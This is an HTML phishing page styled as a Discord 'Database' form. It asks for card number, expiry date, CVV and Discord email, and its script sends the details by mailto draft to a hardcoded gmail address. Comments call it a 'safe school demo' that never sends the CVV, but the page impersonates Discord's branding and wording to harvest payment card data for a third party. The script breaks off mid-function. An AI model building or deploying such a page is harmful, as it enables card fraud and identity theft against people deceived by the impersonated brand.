<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>SYSTEM DATABASE</title>

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: #313338;
      font-family: Arial, Helvetica, sans-serif;
      color: white;
    }

    .card {
      width: 365px;
      padding: 34px 30px 30px;
      background: #2b2d31;
      border-radius: 10px;
      box-shadow: 0 10px 30px rgba(0, .25);
      text-align: center;
    }

    .logo {
      width: 74px;
      height: 74px;
      margin: 0 auto 34px;
      border-radius: 8px;
      background: #5865f2;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
    }

    .logo img {
      width: 100%;
      height: 100%;
      object-fit: contain;
    }

    h1 {
      margin: 0 0 26px;
      font-size: 24px;
    }

    form {
      text-align: left;
    }

    label {
      display: block;
      margin: 0 0 6px;
      font-size: 14px;
      font-weight: 600;
    }

    input {
      width: 100%;
      height: 45px;
      margin-bottom: 15px;
      padding: 0 14px;
      border: 0;
      outline: none;
      border-radius: 6px;
      background: #1e1f22;
      color: white;
      font-size: 14px;
    }

    input::placeholder {
      color: #777b84;
    }

    .row {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 15px;
    }

    button {
      width: 100%;
      height: 47px;
      margin-top: 8px;
      border: 0;
      border-radius: 7px;
      background: #5865f2;
      color: white;
      font-size: 16px;
      cursor: pointer;
    }

    button:hover {
      background: #4752c4;
    }

    .notice {
      margin: 14px 3px 0;
      text-align: center;
      color: #d7d9dc;
      font-size: 12px;
      line-height: 1.25;
    }

    .success {
      display: none;
      margin-top: 14px;
      padding: 10px;
      border-radius: 6px;
      background: #1e1f22;
      color: #b5bac1;
      text-align: center;
      font-size: 13px;
    }
  </style>
</head>

<body>
  <main class="card">

    <div class="logo">
      <img
        src="https://media.discordapp.net/attachments/1547645587430580284/1547646018856812564/XIdrXQAAAABJRU5ErkJggg.png?ex=6aa42d2c&is=6aa2dbac&hm=909d8b196c236a6858e97c77a3ae29f3ed019f91c45c564de91795f6d3cb4092&=&format=webp&quality=lossless"
        alt="Discord shield logo"
      >
    </div>

    <h1>Database</h1>

    <!-- Safe school demo form. -->
    <form id="demoForm">

      <label for="name">Card Holder</label>
      <input
        id="name"
        name="name"
        type="text"
        placeholder="Card Number"
        autocomplete="off"
        required
      >

      <div class="row">
        <div>
          <label for="expiry">Exp Date</label>
          <input
            id="expiry"
            name="expiry"
            type="text"
            placeholder="00/00"
            maxlength="5"
            required
          >
        </div>

        <div>
          <label for="cvv">CVV</label>
          <input
            id="cvv"
            name="cvv"
            type="text"
            inputmode="numeric"
            pattern="[0-9]{3}"
            maxlength="3"
            placeholder="3 digits"
            autocomplete="off"
            required
          >
        </div>
      </div>

      <label for="email">Email</label>
      <input
        id="email"
        name="email"
        type="email"
        placeholder="Discord Email"
        required
      >

      <button type="submit">Submit</button>

      <p class="notice">
        Explore data, trends, and analysis into the work done to help keep people on Discord safe. Transparency reports cover information about enforcement of our platform policies, as well as our response to user data and intellectual property requests.
      </p>

      <div class="success" id="success">
        The information submitted successfully.
      </div>

    </form>
  </main>

  <script>
    document.getElementById("demoForm").addEventListener("submit", function (event) {
      event.preventDefault();

      const name = document.getElementById("name").value;
      const expiry = document.getElementById("expiry").value;
      const email = document.getElementById("email").value;
      const cvv = document.getElementById("cvv").value;

      // Validate CVV locally, but never send it.
      if (!/^[0-9]{3}$/.test(cvv)) {
        document.getElementById("cvv").setCustomValidity(
          "Enter exactly 3 digits."
        );
        document.getElementById("cvv").reportValidity();
        return;
      }

      document.getElementById("cvv").setCustomValidity("");

      // Privacy details only.
      const subject = "Submission Complete";

      const body = [
        `Card Holder: ${name}`,
        `Exp Date: ${expiry}`,
        `Email: ${email}`,
        "",
        "CVV: [ SENT]"
      ].join("\n");

      // Open an email draft to your demo email.
      window.location.href =
        `mailto:rollsoguba@gmail.com?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;

      document.getElementById("success").textContent =
        "Your email app should open with the safe demo details ready to send.";
